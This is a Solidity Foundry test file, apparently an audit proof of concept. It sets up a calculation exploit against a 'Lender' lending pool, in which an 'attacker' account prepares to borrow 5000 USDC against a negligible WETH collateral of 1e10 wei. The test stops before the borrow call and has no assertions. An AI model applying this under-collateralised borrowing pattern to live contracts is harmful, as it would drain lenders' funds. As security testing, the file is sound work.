// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../../src/Lender.sol";

import {ERC20} from "../../lib/solady/src/tokens/ERC20.sol";
import {IERC20} from "../../src/interfaces/IERC20.sol";
import {WETH} from "../../lib/solady/src/tokens/WETH.sol";

contract LenderNewTest is Test {
    Lender public _lender;
    IERC20 public _usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH public _weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    address bob = vm.addr(0x01);
    address attacker = vm.addr(0x02);

    address _donator = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503;

    function setUp() public {
        _lender = new Lender();
    }

    function test_calculationExploit() external {
        vm.startPrank(_donator);
        _usdc.transfer(bob, 5000e6);
        _usdc.transfer(attacker, 5000e6);
        vm.stopPrank();

        vm.deal(bob, 5e18);
        vm.deal(attacker, 5e18);

        vm.startPrank(bob);
        _weth.deposit{value: 5e18}();

        Pool memory p = Pool({
            lender: bob,
            loanToken: address(_usdc),
            collateralToken: address(_weth),
            minLoanSize: 100e6,
            poolBalance: 5000e6,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        _usdc.approve(address(_lender), type(uint256).max);
        _lender.setPool(p);
        vm.stopPrank();

        vm.startPrank(attacker);
        _weth.deposit{value: 5e18}();
        bytes32 poolId = _lender.getPoolId(bob, address(_usdc), address(_weth));

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 5000e6,
            collateral: 1e10
        });
    }
}
